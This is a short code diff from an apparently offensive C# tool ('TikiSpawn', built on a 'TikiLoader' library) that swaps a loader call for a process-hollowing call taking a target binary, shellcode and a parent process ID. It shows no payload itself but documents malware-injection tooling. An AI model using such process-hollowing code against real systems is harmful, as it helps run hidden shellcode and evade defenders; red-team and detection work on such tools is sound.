@@ -2,7 +2,6 @@
 using System.Net;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-
 using TikiLoader;
 
 [ComVisible(true)]
@@ -53,11 +52,10 @@ public class TikiSpawn
             Environment.Exit(1);
         }
 
-        var ldr = new Loader();
-
         try
         {
-            ldr.Load(binary, shellcode, ppid);
+            var hollower = new Hollower();
+            hollower.Hollow(binary, shellcode, ppid);
         }
         catch (Exception e)
         {
